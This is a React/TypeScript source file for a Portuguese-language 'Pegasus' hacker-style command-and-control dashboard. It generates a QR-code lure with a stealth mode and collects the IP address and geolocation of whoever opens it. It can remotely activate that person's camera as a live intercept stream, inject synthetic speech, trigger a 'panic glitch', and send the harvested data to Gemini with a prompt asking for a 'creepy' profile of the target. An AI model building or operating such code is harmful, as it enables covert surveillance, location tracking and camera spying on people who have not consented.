
import React, { useEffect, useState, useCallback, useRef } from 'react';
import { v4 as uuidv4 } from 'uuid';
import Terminal from '../components/Terminal';
import QRCodeDisplay from '../components/QRCodeDisplay';
import HackerMap from '../components/HackerMap';
import { mqttService } from '../services/mqttService';
import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
import { Camera, X, Disc, Video, Ghost, EyeOff, Eye, Brain, Mic, Zap, Send } from 'lucide-react';
import { GoogleGenAI } from "@google/genai";

const Dashboard: React.FC = () => {
  const [sessionId] = useState(uuidv4());
  const [logs, setLogs] = useState<TerminalLog[]>([]);
  const [connected, setConnected] = useState(false);
  const [targetUrl, setTargetUrl] = useState('');
  const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
  const [isStealth, setIsStealth] = useState(false);
  const [lastPayload, setLastPayload] = useState<DeviceInfo | null>(null);
  
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraStream, setCameraStream] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [ttsText, setTtsText] = useState('');
  const [isGeneratingAI, setIsGeneratingAI] = useState(false);
  
  const audioCtxRef = useRef<AudioContext | null>(null);

  const addLog = useCallback((message: string, type: TerminalLog['type'] = 'info', link?: string) => {
    setLogs(prev => [...prev, {
      id: uuidv4(),
      message,
      type,
      timestamp: new Date().toISOString(),
      link
    }]);
  }, []);

  const runAIProfiling = async () => {
    if (!lastPayload) return;
    setIsGeneratingAI(true);
    addLog("SOLICITANDO ANÁLISE PSICOGRÁFICA VIA NEURAL_LINK...", "ai");
    
    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const prompt = `Analise estes dados de telemetria de um dispositivo alvo e crie um perfil hacker "creepy" e técnico do usuário. Seja conciso, use termos de segurança cibernética. Dados: ${JSON.stringify(lastPayload)}`;
      
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: prompt,
      });

      addLog(`RELATÓRIO DE INTELIGÊNCIA: ${response.text}`, "ai");
    } catch (e) {
      addLog("ERRO NO PROCESSAMENTO NEURAL", "error");
    } finally {
      setIsGeneratingAI(false);
    }
  };

  const sendTTS = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!ttsText || !connected) return;
    addLog(`INJETANDO VOZ SINTÉTICA: "${ttsText}"`, "warning");
    mqttService.publishCommand(sessionId, { 
      type: 'SPEAK', 
      timestamp: new Date().toISOString(),
      payload: { text: ttsText }
    });
    setTtsText('');
  };

  const triggerGlitch = () => {
    if (!connected) return;
    addLog("EXECUTANDO PROTOCOLO PANIC_GLITCH...", "error");
    mqttService.publishCommand(sessionId, { type: 'GLITCH', timestamp: new Date().toISOString() });
  };

  const toggleCamera = () => {
    if (!connected) return;
    if (!isCameraActive) {
      mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(true);
      setIsCameraActive(true);
    } else {
      mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(false);
      setIsCameraActive(false);
      setCameraStream(null);
    }
  };

  useEffect(() => {
    const baseUrl = window.location.href.split('#')[0];
    const scanUrl = `${baseUrl}#/scan?session=${sessionId}${isStealth ? '&stealth=true' : ''}`;
    setTargetUrl(scanUrl);
  }, [sessionId, isStealth]);

  useEffect(() => {
    mqttService.connect(
      sessionId,
      (payload: DeviceInfo) => {
        setLastPayload(payload);
        addLog(`TELEMETRIA RECEBIDA: ${payload.ip}`, 'success');
        if (payload.coords) setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
      },
      () => {
        setConnected(true);
        addLog(`SISTEMA PEGASUS PRONTO. AGUARDANDO UPLINK...`, 'system');
      },
      undefined, 
      (streamData: StreamMessage) => setCameraStream(streamData.image)
    );
    return () => mqttService.disconnect();
  }, [sessionId, addLog]);

  return (
    <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-black font-mono">
      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col border-r border-gray-800">
        <Terminal logs={logs} connected={connected} sessionId={sessionId} />
        
        {/* Advanced C2 Controls */}
        <div className="bg-black border-t border-gray-800 p-3 space-y-3">
           <form onSubmit={sendTTS} className="flex gap-2">
              <div className="flex-1 bg-gray-900 border border-gray-700 flex items-center px-2">
                 <Mic size={14} className="text-gray-500 mr-2" />
                 <input 
                    value={ttsText}
                    onChange={(e) => setTtsText(e.target.value)}
                    placeholder="COMANDO DE VOZ REMOTO..." 
                    className="bg-transparent border-none text-xs py-2 w-full text-green-500 focus:outline-none placeholder:text-gray-700"
                 />
              </div>
              <button type="submit" className="bg-green-900/20 border border-green-600 p-2 text-green-500 hover:bg-green-900/40">
                <Send size={16} />
              </button>
           </form>

           <div className="flex flex-wrap gap-2">
             <button onClick={() => setIsStealth(!isStealth)} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border transition-all ${isStealth ? 'bg-blue-900/30 border-blue-500 text-blue-400' : 'bg-gray-800 border-gray-600 text-gray-400'}`}>
               {isStealth ? <EyeOff size={14} /> : <Eye size={14} />} STEALTH
             </button>
             <button onClick={runAIProfiling} disabled={!lastPayload || isGeneratingAI} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-purple-900/20 border-purple-600 text-purple-400 disabled:opacity-30">
               <Brain size={14} className={isGeneratingAI ? 'animate-pulse' : ''} /> IA_PROFILE
             </button>
             <button onClick={toggleCamera} disabled={!connected} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-gray-800 border-gray-600 text-gray-300 disabled:opacity-30'}`}>
               <Camera size={14} /> CAM
             </button>
             <button onClick={triggerGlitch} disabled={!connected} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-red-900/20 border-red-600 text-red-500 hover:bg-red-600 hover:text-white transition-colors">
               <Zap size={14} /> PANIC
             </button>
           </div>
        </div>
      </div>

      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-10">
        {targetCoords ? <HackerMap lat={targetCoords.lat} lng={targetCoords.lng} /> : <QRCodeDisplay url={targetUrl} />}
      </div>

      {showCameraModal && (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4">
          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-2xl">
            <div className="bg-red-900/20 p-2 flex justify-between items-center text-red-500 text-[10px]">
              <span className="flex items-center gap-2"><Disc size={12} className="animate-pulse" /> LIVE_INTERCEPT_STREAMING</span>
              <button onClick={toggleCamera}><X size={16} /></button>
            </div>
            <div className="aspect-video bg-black flex items-center justify-center overflow-hidden">
              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" /> : <div className="text-red-500 animate-pulse">WAITING_FOR_DATA...</div>}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
